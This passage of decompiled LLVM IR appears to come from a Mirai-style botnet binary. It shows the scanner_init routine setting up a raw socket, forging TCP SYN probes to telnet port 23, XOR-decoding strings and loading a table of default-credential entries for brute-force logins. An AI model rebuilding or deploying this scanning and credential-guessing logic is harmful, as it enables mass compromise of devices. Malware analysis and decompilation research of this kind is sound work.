  store i32 %v0_804ed06, i32* %v4_804ed06, align 4
  store i32 %v1_804ed09.pre-phi, i32* %edx.global-to-local, align 4
  %v2_804ed0b = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ed0b = load i32, i32* %eax.global-to-local, align 4
  %v4_804ed0b = add i32 %v2_804ed0b, 12
  %v5_804ed0b = add i32 %v4_804ed0b, %v3_804ed0b
  %v6_804ed0b = inttoptr i32 %v5_804ed0b to i8*
  store i8 %v1_804ecb2, i8* %v6_804ed0b, align 1
  store i32 %v0_804ec7f, i32* %eax.global-to-local, align 4
  %v0_804ed13 = load i32, i32* @global_var_8057d88.49, align 8
  store i32 %v0_804ed13, i32* @ebp, align 4
  %v1_804ed1a = inttoptr i32 %v0_804ec7f to i8*
  %v2_804ed1a = call i32 @util_strlen(i8* %v1_804ed1a)
  store i32 %v2_804ed1a, i32* %eax.global-to-local, align 4
  %v1_804ed1f = trunc i32 %v2_804ed1a to i8
  store i32 %v2_804ed1a, i32* @edi, align 4
  %v1_804ed21 = add i32 %v2_804ed1a, 1
  store i32 %v1_804ed21, i32* @ebx, align 4
  %v1_804ed27 = call i32 @malloc(i32 %v1_804ed21)
  store i32 %v1_804ed27, i32* @esi, align 4
  %v0_804ed31 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec7f, i32* %eax.global-to-local, align 4
  %v3_804ed38 = call i32 @util_memcpy(i32 %v1_804ed27, i32 %v0_804ec7f, i32 %v0_804ed31)
  store i32 %v3_804ed38, i32* %eax.global-to-local, align 4
  %tmp26 = icmp slt i8 %v1_804ed1f, 1
  br i1 %tmp26, label %dec_label_pc_804ecde.dec_label_pc_804ed4f_crit_edge, label %dec_label_pc_804ed44

dec_label_pc_804ecde.dec_label_pc_804ed4f_crit_edge: ; preds = %dec_label_pc_804ecde
  %.pre9 = mul i32 %v2_804ed1a, 16777216
  %.pre10 = sdiv i32 %.pre9, 16777216
  br label %dec_label_pc_804ed4f

dec_label_pc_804ed44:                             ; preds = %dec_label_pc_804ecde
  store i32 0, i32* %eax.global-to-local, align 4
  %sext2 = mul i32 %v2_804ed1a, 16777216
  %v2_804ed4b = sdiv i32 %sext2, 16777216
  br label %dec_label_pc_804ed46

dec_label_pc_804ed46:                             ; preds = %dec_label_pc_804ed46, %dec_label_pc_804ed44
  %v11_804ed46 = phi i32 [ %v1_804ed4a, %dec_label_pc_804ed46 ], [ 0, %dec_label_pc_804ed44 ]
  %v1_804ed46 = load i32, i32* @esi, align 4
  %v2_804ed46 = add i32 %v1_804ed46, %v11_804ed46
  %v3_804ed46 = inttoptr i32 %v2_804ed46 to i8*
  %v4_804ed46 = load i8, i8* %v3_804ed46, align 1
  %v5_804ed46 = xor i8 %v4_804ed46, 80
  store i8 %v5_804ed46, i8* %v3_804ed46, align 1
  %v0_804ed4a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed4a = add i32 %v0_804ed4a, 1
  store i32 %v1_804ed4a, i32* %eax.global-to-local, align 4
  %v13_804ed4b = icmp eq i32 %v1_804ed4a, %v2_804ed4b
  %v1_804ed4d = icmp eq i1 %v13_804ed4b, false
  br i1 %v1_804ed4d, label %dec_label_pc_804ed46, label %dec_label_pc_804ed4f

dec_label_pc_804ed4f:                             ; preds = %dec_label_pc_804ed46, %dec_label_pc_804ecde.dec_label_pc_804ed4f_crit_edge
  %v1_804ed58.pre-phi = phi i32 [ %.pre10, %dec_label_pc_804ecde.dec_label_pc_804ed4f_crit_edge ], [ %v2_804ed4b, %dec_label_pc_804ed46 ]
  %v0_804ed53 = load i32, i32* @global_var_8057d88.49, align 8
  store i32 %v0_804ed53, i32* %eax.global-to-local, align 4
  store i32 %v1_804ed58.pre-phi, i32* %ebx.global-to-local, align 4
  %v0_804ed5a = load i32, i32* @esi, align 4
  %v2_804ed5a = load i32, i32* @ebp, align 4
  %v3_804ed5a = or i32 %v2_804ecef, 4
  %v4_804ed5a = add i32 %v2_804ed5a, %v3_804ed5a
  %v5_804ed5a = inttoptr i32 %v4_804ed5a to i32*
  store i32 %v0_804ed5a, i32* %v5_804ed5a, align 4
  %v0_804ed5e = load i32, i32* @global_var_8057d44.48, align 4
  %v1_804ed66 = add i32 %v0_804ed5e, 1
  store i32 %v1_804ed66, i32* %ecx.global-to-local, align 4
  %v2_804ed67 = mul i32 %v0_804ed5e, 16
  store i32 %v2_804ed67, i32* %edx.global-to-local, align 4
  %v0_804ed6a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ed6a = trunc i32 %v0_804ed6a to i8
  %v3_804ed6a = load i32, i32* %eax.global-to-local, align 4
  %v4_804ed6a = or i32 %v2_804ed67, 13
  %v5_804ed6a = add i32 %v3_804ed6a, %v4_804ed6a
  %v6_804ed6a = inttoptr i32 %v5_804ed6a to i8*
  store i8 %v1_804ed6a, i8* %v6_804ed6a, align 1
  %v0_804ed6e = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ed6e, i32* @global_var_8057d44.48, align 4
  %v0_804ed74 = load i32, i32* @global_var_8057d88.49, align 8
  store i32 %v0_804ed74, i32* %ebx.global-to-local, align 4
  %v0_804ed7a = load i16, i16* @global_var_8057d8c.50, align 4
  %v1_804ed7a = zext i16 %v0_804ed7a to i32
  %v2_804ed7a = load i32, i32* %eax.global-to-local, align 4
  %v3_804ed7a = and i32 %v2_804ed7a, -65536
  %v4_804ed7a = or i32 %v3_804ed7a, %v1_804ed7a
  store i32 %v4_804ed7a, i32* %eax.global-to-local, align 4
  %v2_804ed80 = load i32, i32* %edx.global-to-local, align 4
  %v4_804ed80 = add i32 %v0_804ed74, 8
  %v5_804ed80 = add i32 %v4_804ed80, %v2_804ed80
  %v6_804ed80 = inttoptr i32 %v5_804ed80 to i16*
  store i16 %v0_804ed7a, i16* %v6_804ed80, align 2
  %v0_804ed85 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed85 = trunc i32 %v0_804ed85 to i16
  %v6_804ed85 = add i16 %v1_804ed85, %v1_804ec8c
  %v22_804ed85 = zext i16 %v6_804ed85 to i32
  %v24_804ed85 = and i32 %v0_804ed85, -65536
  %v25_804ed85 = or i32 %v22_804ed85, %v24_804ed85
  store i32 %v25_804ed85, i32* %eax.global-to-local, align 4
  %v3_804ed8a = load i32, i32* %edx.global-to-local, align 4
  %v4_804ed8a = load i32, i32* %ebx.global-to-local, align 4
  %v5_804ed8a = add i32 %v3_804ed8a, 10
  %v6_804ed8a = add i32 %v5_804ed8a, %v4_804ed8a
  %v7_804ed8a = inttoptr i32 %v6_804ed8a to i16*
  store i16 %v6_804ed85, i16* %v7_804ed8a, align 2
  store i16 %v6_804ed85, i16* @global_var_8057d8c.50, align 4
  store i32 %v0_804ec73, i32* @ebx, align 4
  store i32 %v0_804ec72, i32* @esi, align 4
  store i32 %v0_804ec71, i32* @edi, align 4
  store i32 %v0_804ec70, i32* @ebp, align 4
  %v1_804ed9c = sext i16 %v6_804ed85 to i32
  ret i32 %v1_804ed9c

; uselistorder directives
  uselistorder i16 %v6_804ed85, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804ed67, { 1, 0 }
  uselistorder i32 %v1_804ed4a, { 0, 2, 1 }
  uselistorder i32 %v2_804ed4b, { 1, 0 }
  uselistorder i32 %v2_804ecef, { 1, 0 }
  uselistorder i32 %v1_804ecd9, { 0, 2, 1 }
  uselistorder i8 %v1_804ecb2, { 1, 0 }
  uselistorder i32 %v2_804ec83, { 1, 0 }
  uselistorder i32 %v0_804ec7f, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22 }
  uselistorder i32 (i8*)* @util_strlen, { 1, 2, 22, 3, 4, 5, 6, 7, 38, 39, 40, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 27, 28, 25, 26, 29, 30, 31, 78, 79, 80, 36, 37, 32, 33, 34, 35, 76, 77, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 0, 73, 74, 75 }
  uselistorder label %dec_label_pc_804ecde, { 1, 0 }
}

define i32 @scanner_init() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp136 = call i32 @__decompiler_undefined_function_0()
  %tmp137 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-1932 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-1916 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804eda0 = load i32, i32* @ebp, align 4
  %v0_804eda1 = load i32, i32* @edi, align 4
  %v0_804eda2 = load i32, i32* @esi, align 4
  %v0_804eda3 = load i32, i32* @ebx, align 4
  store i32 %v0_804eda3, i32* %stack_var_-16, align 4
  %v1_804edaa = call i32 @__libc_fork(i32 %v0_804eda3)
  store i32 %v1_804edaa, i32* %eax.global-to-local, align 4
  store i32 %v1_804edaa, i32* @global_var_805a878.46, align 8
  %tmp163 = icmp slt i32 %v1_804edaa, 1
  br i1 %tmp163, label %dec_label_pc_804edc3, label %dec_label_pc_804edb8

dec_label_pc_804edb8:                             ; preds = %dec_label_pc_804edc3, %entry
  %v0_804edc2 = phi i32 [ 0, %dec_label_pc_804edc3 ], [ %v1_804edaa, %entry ]
  %v2_804edbe = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804edbe, i32* %ebx.global-to-local, align 4
  store i32 %v0_804eda0, i32* @ebp, align 4
  ret i32 %v0_804edc2

dec_label_pc_804edc3:                             ; preds = %entry
  %v1_804edc3 = add i32 %v1_804edaa, 1
  %v8_804edc3 = icmp eq i32 %v1_804edc3, 0
  store i32 %v1_804edc3, i32* %eax.global-to-local, align 4
  br i1 %v8_804edc3, label %dec_label_pc_804edb8, label %dec_label_pc_804edc6

dec_label_pc_804edc6:                             ; preds = %dec_label_pc_804edc3
  %v0_804edc6 = call i32 @util_local_addr()
  store i32 %v0_804edc6, i32* %eax.global-to-local, align 4
  store i32 %v0_804edc6, i32* @global_var_805a858.27, align 8
  %v0_804edd0 = call i32 @rand_init()
  store i32 %v0_804edd0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-1916, align 4
  %v2_804edda = call i32 @__GI_time(i32* null)
  store i32 %v2_804edda, i32* @global_var_8057d90.47, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 256, i32* %stack_var_-1916, align 4
  %v3_804edf0 = call i32 @calloc(i64 256, i32 288)
  store i32 0, i32* %stack_var_-28, align 4
  store i32 %v3_804edf0, i32* %ecx.global-to-local, align 4
  store i32 %v3_804edf0, i32* @global_var_805a870.51, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee0c

dec_label_pc_804ee0c:                             ; preds = %dec_label_pc_804ee0c.dec_label_pc_804ee0c_crit_edge, %dec_label_pc_804edc6
  %v1_804ee19 = phi i32 [ %v1_804ee19.pre, %dec_label_pc_804ee0c.dec_label_pc_804ee0c_crit_edge ], [ %v3_804edf0, %dec_label_pc_804edc6 ]
  %v3_804ee0f = phi i32 [ %v1_804ee2f, %dec_label_pc_804ee0c.dec_label_pc_804ee0c_crit_edge ], [ 0, %dec_label_pc_804edc6 ]
  store i32 %v3_804ee0f, i32* %edx.global-to-local, align 4
  %v2_804ee16 = mul i32 %v3_804ee0f, 288
  %v2_804ee19 = or i32 %v2_804ee16, 12
  %v3_804ee19 = add i32 %v2_804ee19, %v1_804ee19
  %v4_804ee19 = inttoptr i32 %v3_804ee19 to i32*
  store i32 0, i32* %v4_804ee19, align 4
  %v0_804ee21 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ee24 = mul i32 %v0_804ee21, 288
  %v1_804ee27 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ee27 = or i32 %v2_804ee24, 4
  %v3_804ee27 = add i32 %v2_804ee27, %v1_804ee27
  %v4_804ee27 = inttoptr i32 %v3_804ee27 to i32*
  store i32 -1, i32* %v4_804ee27, align 4
  %v0_804ee2f = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee2f = add i32 %v0_804ee2f, 1
  store i32 %v1_804ee2f, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee2f, i32* %stack_var_-28, align 4
  %v7_804ee3e = icmp sgt i32 %v1_804ee2f, 255
  br i1 %v7_804ee3e, label %dec_label_pc_804ee40, label %dec_label_pc_804ee0c.dec_label_pc_804ee0c_crit_edge

dec_label_pc_804ee0c.dec_label_pc_804ee0c_crit_edge: ; preds = %dec_label_pc_804ee0c
  %v1_804ee19.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ee0c

dec_label_pc_804ee40:                             ; preds = %dec_label_pc_804ee0c
  store i32 2, i32* %stack_var_-1916, align 4
  %v3_804ee47 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804ee47, i32* %eax.global-to-local, align 4
  store i32 %v3_804ee47, i32* @global_var_805a874.52, align 4
  %v10_804ee54 = icmp eq i32 %v3_804ee47, -1
  br i1 %v10_804ee54, label %dec_label_pc_804f59d, label %dec_label_pc_804ee5d

dec_label_pc_804ee5d:                             ; preds = %dec_label_pc_804ee40
  store i32 %v3_804ee47, i32* %stack_var_-1916, align 4
  %v3_804ee63 = call i32 @__libc_fcntl(i32 %v3_804ee47, i32 3, i32 0)
  %v12_804ee6b = or i32 %v3_804ee63, 2048
  store i32 %v12_804ee6b, i32* %eax.global-to-local, align 4
  %v0_804ee6e = load i32, i32* @global_var_805a874.52, align 4
  store i32 %v0_804ee6e, i32* @edi, align 4
  store i32 %v0_804ee6e, i32* %stack_var_-1916, align 4
  %v3_804ee78 = call i32 @__libc_fcntl(i32 %v0_804ee6e, i32 4, i32 %v12_804ee6b)
  %v2_804ee7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ee7d, i32* %eax.global-to-local, align 4
  %v0_804ee84 = load i32, i32* @global_var_805a874.52, align 4
  store i32 %v0_804ee84, i32* @esi, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-1916, align 4
  store i32 %v0_804ee84, i32* %stack_var_-1932, align 4
  %v5_804eea2 = call i32 @__GI_setsockopt(i32 %v0_804ee84, i32 0, i32 3, i32 %v2_804ee7d, i32 4)
  store i32 %v5_804eea2, i32* @eax, align 4
  %v1_804eeaa = icmp eq i32 %v5_804eea2, 0
  %v1_804eeac = icmp eq i1 %v1_804eeaa, false
  br i1 %v1_804eeac, label %dec_label_pc_80503c5, label %dec_label_pc_804eeb2

dec_label_pc_804eeb2:                             ; preds = %dec_label_pc_804ee5d, %dec_label_pc_804eeb2
  %v0_804eeb2 = load i32, i32* %stack_var_-1932, align 4
  %v1_804eeb2 = call i32 @rand_next(i32 %v0_804eeb2)
  %v2_804eeb2 = trunc i32 %v1_804eeb2 to i16
  %sext = mul i32 %v1_804eeb2, 65536
  %v1_804eeb7 = sdiv i32 %sext, 65536
  store i32 %v1_804eeb7, i32* @ebx, align 4
  %v3_804eebe = call i16 @llvm.bswap.i16(i16 %v2_804eeb2)
  %v4_804eebe = zext i16 %v3_804eebe to i32
  %v7_804eebe = and i32 %v1_804eeb7, -65536
  %v8_804eebe = or i32 %v4_804eebe, %v7_804eebe
  store i32 %v8_804eebe, i32* %eax.global-to-local, align 4
  %v6_804eec2 = icmp ult i16 %v3_804eebe, 1023
  %v10_804eec2 = icmp eq i16 %v2_804eeb2, -253
  %v2_804eec6 = or i1 %v10_804eec2, %v6_804eec2
  br i1 %v2_804eec6, label %dec_label_pc_804eeb2, label %dec_label_pc_804eec8

dec_label_pc_804eec8:                             ; preds = %dec_label_pc_804eeb2
  store i8 69, i8* bitcast (i32* @global_var_8057d60.53 to i8*), align 32
  store i16 10240, i16* bitcast (i32* @global_var_8057d62.54 to i16*), align 4
  %v2_804eed8 = call i32 @rand_next(i32 %v1_804eeb7)
  %v3_804eed8 = trunc i32 %v2_804eed8 to i16
  store i8 64, i8* bitcast (i32* @global_var_8057d68.55 to i8*), align 8
  store i16 %v3_804eed8, i16* bitcast (i32* @global_var_8057d64.56 to i16*), align 4
  %v0_804eeea = load i8, i8* @global_var_8057d80.57, align 128
  %tmp = urem i8 %v0_804eeea, 16
  %v1_804eeef = zext i8 %tmp to i32
  store i8 6, i8* bitcast (i32* @global_var_8057d69.58 to i8*), align 4
  %v1_804eef9 = or i32 %v1_804eeef, 80
  %v3_804eef9 = trunc i32 %v1_804eef9 to i8
  store i32 %v1_804eef9, i32* %eax.global-to-local, align 4
  store i16 5888, i16* @global_var_8057d76.59, align 2
  %v0_804ef05 = load i32, i32* @ebx, align 4
  %v1_804ef05 = trunc i32 %v0_804ef05 to i16
  store i16 %v1_804ef05, i16* bitcast (i32* @global_var_8057d74.60 to i16*), align 4
  store i8 %v3_804eef9, i8* @global_var_8057d80.57, align 128
  %v2_804ef11 = call i32 @rand_next(i32 %v1_804eeb7)
  %v3_804ef11 = trunc i32 %v2_804ef11 to i16
  store i32 12, i32* @ecx, align 4
  store i16 %v3_804ef11, i16* bitcast (i32* @global_var_8057d82.61 to i16*), align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8055895.62 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  %v0_804ef2b = load i8, i8* @global_var_8057d81.64, align 1
  %v1_804ef2b = or i8 %v0_804ef2b, 2
  store i8 %v1_804ef2b, i8* @global_var_8057d81.64, align 1
  %v0_804ef32 = call i32 @add_auth_entry()
  store i32 9, i32* @ecx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805589d.65 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  %v0_804ef46 = call i32 @add_auth_entry()
  store i32 13, i32* @ecx, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80558a2.66 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  %v0_804ef5a = call i32 @add_auth_entry()
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  store i32 10, i32* @ecx, align 4
  %v0_804ef6b = call i32 @add_auth_entry()
  store i32 17, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_80558ab.67 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  %v0_804ef7f = call i32 @add_auth_entry()
  store i32 5, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055868.68 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  %v0_804ef93 = call i32 @add_auth_entry()
  store i32 9, i32* @ecx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805594f.69 to i32), i32* @edx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), i32* @eax, align 4
  %v0_804efa7 = call i32 @add_auth_entry()
  store i32 3, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055868.68 to i32), i32* @edx, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80558b8.70 to i32), i32* @eax, align 4
  %v0_804efbb = call i32 @add_auth_entry()
  store i32 8, i32* @ecx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558bc.71 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804efcf = call i32 @add_auth_entry()
  store i32 10, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80558c6.73 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804efe3 = call i32 @add_auth_entry()
  store i32 4, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055868.68 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804eff7 = call i32 @add_auth_entry()
  store i32 9, i32* @ecx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558cd.74 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f00b = call i32 @add_auth_entry()
  store i32 12, i32* @ecx, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80558d3.75 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f01f = call i32 @add_auth_entry()
  store i32 9, i32* @ecx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805592d.76 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f033 = call i32 @add_auth_entry()
  store i32 9, i32* @ecx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80558dc.77 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f047 = call i32 @add_auth_entry()
  store i32 12, i32* @ecx, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80558e2.78 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f05b = call i32 @add_auth_entry()
  store i32 11, i32* @ecx, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_80558eb.79 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f06f = call i32 @add_auth_entry()
  store i32 7, i32* @ecx, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805591b.80 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f083 = call i32 @add_auth_entry()
  store i32 10, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80558f3.81 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f097 = call i32 @add_auth_entry()
  store i32 7, i32* @ecx, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80558fa.82 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f0ab = call i32 @add_auth_entry()
  store i32 12, i32* @ecx, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80558fe.83 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f0bf = call i32 @add_auth_entry()
  store i32 12, i32* @ecx, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80558a2.66 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f0d3 = call i32 @add_auth_entry()
  store i32 16, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_80558ab.67 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f0e7 = call i32 @add_auth_entry()
  store i32 9, i32* @ecx, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8055907.84 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f0fb = call i32 @add_auth_entry()
  store i32 10, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805590d.85 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f10f = call i32 @add_auth_entry()
  store i32 14, i32* @ecx, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8055914.86 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f123 = call i32 @add_auth_entry()
  store i32 10, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805591f.87 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f137 = call i32 @add_auth_entry()
  store i32 16, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055926.88 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80558c1.72 to i32), i32* @eax, align 4
  %v0_804f14b = call i32 @add_auth_entry()
  store i32 7, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055868.68 to i32), i32* @edx, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_80558eb.79 to i32), i32* @eax, align 4
  %v0_804f15f = call i32 @add_auth_entry()
  store i32 ptrtoint ([5 x i8]* @global_var_8055933.89 to i32), i32* @edx, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8055933.89 to i32), i32* @eax, align 4
  store i32 8, i32* @ecx, align 4
  %v0_804f170 = call i32 @add_auth_entry()
  store i32 6, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055868.68 to i32), i32* @edx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8055938.90 to i32), i32* @eax, align 4
  %v0_804f184 = call i32 @add_auth_entry()
  store i32 3, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8055868.68 to i32), i32* @edx, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805593f.91 to i32), i32* @eax, align 4
  %v0_804f198 = call i32 @add_auth_entry()
  store i32 ptrtoint ([8 x i8]* @global_var_8055943.92 to i32), i32* @edx, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8055943.92 to i32), i32* @eax, align 4
  store i32 14, i32* @ecx, align 4
  %v0_804f1a9 = call i32 @add_auth_entry()
  store i32 ptrtoint ([9 x i8]* @global_var_805594b.93 to i32), i32* @edx, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8055954.94 to i32), i32* @eax, align 4
  store i32 18, i32* @ecx, align 4
  %v0_804f1bd = call i32 @add_auth_entry()
  %v2_804f1c2 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_804f1c2, i32* %eax.global-to-local, align 4
  %v2_804f1c9 = ptrtoint i32* %stack_var_-328 to i32
  store i32 %v2_804f1c9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f1d8

dec_label_pc_804f1d8:                             ; preds = %dec_label_pc_804fcc6, %dec_label_pc_804eec8
  %stack_var_-1892.0 = phi i32 [ %v2_804f1c9, %dec_label_pc_804eec8 ], [ %stack_var_-1892.5, %dec_label_pc_804fcc6 ]
  %stack_var_-1888.0 = phi i32 [ %v2_804f1c2, %dec_label_pc_804eec8 ], [ %stack_var_-1888.5, %dec_label_pc_804fcc6 ]
  %v0_804f1d8 = load i32, i32* @global_var_8057d90.47, align 16
  store i32 %v0_804f1d8, i32* @esi, align 4
  %v0_804f1de = load i32, i32* @esp, align 4
  %v1_804f1de = add i32 %v0_804f1de, 32
  %v2_804f1de = inttoptr i32 %v1_804f1de to i32*
  %v3_804f1de = load i32, i32* %v2_804f1de, align 4
  %v15_804f1de = icmp eq i32 %v3_804f1de, %v0_804f1d8
  br i1 %v15_804f1de, label %dec_label_pc_804f3ff, label %dec_label_pc_804f1e8

dec_label_pc_804f1e8:                             ; preds = %dec_label_pc_804f1d8
  %v1_804f1e8 = add i32 %v0_804f1de, 1872
  %v2_804f1e8 = inttoptr i32 %v1_804f1e8 to i32*
  store i32 0, i32* %v2_804f1e8, align 4
  %v0_804f1f3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1f3

dec_label_pc_804f1f3:                             ; preds = %dec_label_pc_804f368, %dec_label_pc_804f1e8
  %v0_804f1f3 = phi i32 [ %v1_804f3ed, %dec_label_pc_804f368 ], [ %v0_804f1f3.pre, %dec_label_pc_804f1e8 ]
  %stack_var_-1892.1 = phi i32 [ %stack_var_-1892.2, %dec_label_pc_804f368 ], [ %stack_var_-1892.0, %dec_label_pc_804f1e8 ]
  %stack_var_-1888.1 = phi i32 [ %stack_var_-1888.2, %dec_label_pc_804f368 ], [ %stack_var_-1888.0, %dec_label_pc_804f1e8 ]
  %v1_804f1f3 = add i32 %v0_804f1f3, 1828
  %v2_804f1f3 = inttoptr i32 %v1_804f1f3 to i32*
  store i32 0, i32* %v2_804f1f3, align 4
  %v0_804f1fe = load i32, i32* @esp, align 4
  %v1_804f1fe = add i32 %v0_804f1fe, 1832
  %v2_804f1fe = inttoptr i32 %v1_804f1fe to i32*
  store i32 0, i32* %v2_804f1fe, align 4
  %v0_804f209 = load i32, i32* @esp, align 4
  %v1_804f209 = add i32 %v0_804f209, 1836
  %v2_804f209 = inttoptr i32 %v1_804f209 to i32*
  store i32 0, i32* %v2_804f209, align 4
  %v0_804f214 = load i32, i32* @esp, align 4
  %v1_804f214 = add i32 %v0_804f214, 1840
  %v2_804f214 = inttoptr i32 %v1_804f214 to i32*
  store i32 0, i32* %v2_804f214, align 4
